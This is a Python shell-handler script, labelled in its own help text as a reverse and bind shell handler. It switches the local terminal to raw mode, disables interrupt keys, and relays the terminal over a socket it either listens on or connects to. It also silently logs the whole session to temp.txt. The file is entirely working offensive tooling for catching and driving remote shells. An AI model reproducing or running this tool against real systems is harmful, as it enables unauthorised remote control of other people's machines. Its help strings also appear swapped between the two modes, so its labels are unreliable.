import io
import termios
import select
import socket
import os
import fcntl
import argparse

class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        ptylink = os.readlink(f"/proc/{pid}/fd/{slave}")
        print(ptylink)
        self.pty = pty = io.open(ptylink, "rb+", buffering=0)

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = b'\x00'
        newattr[6][termios.VQUIT] = b'\x00'
        newattr[6][termios.VSUSP] = b'\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)

class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [ [ sock, [] ], [ pty, [] ] ]
        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [ sock, pty ]

        data = b" "
        all_data = b""
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)
                all_data += data

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)
                all_data += data

        # close the socket
        sock.close()
        with open("temp.txt", "wb") as f:
            f.write(all_data)

if __name__ == "__main__":
    # I could do this validation with regex.. but meh.
    def AddressString(value):
        address = value.split(":")

        if len(address) != 2:
            raise argparse.ArgumentTypeError("Address must be in format IP:Port.")

        if len(address[0].split(".")) != 4:
           raise argparse.ArgumentTypeError("Invalid IP length.")

        for octet in address[0].split("."):
            try:
                if int(octet) > 255 or int(octet) < 0:
                    raise argparse.ArgumentTypeError("Invalid octet in address.")
            except ValueError:
                raise argparse.ArgumentTypeError("Invalid octet in address.")

        try:
            address[1] = int(address[1])
            if address[1] < 0 or address[1] > 65535:
                raise argparse.ArgumentTypeError("Invalid port number")
        except ValueError:
            raise argparse.ArgumentTypeError("Invalid port number.")

        return tuple(address)

    parser = argparse.ArgumentParser()

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-b", "--bind", help="Reverse shell handler.",
                       action="store_true")
    group.add_argument("-c", "--connect", help="Bind shell handler.",
                       action="store_true")
    parser.add_argument("address", type=AddressString,
                        help="IP address/port to bind/connect to.")
    args = parser.parse_args()

    s = Shell(args.address, bind=args.bind)
    s.handle()
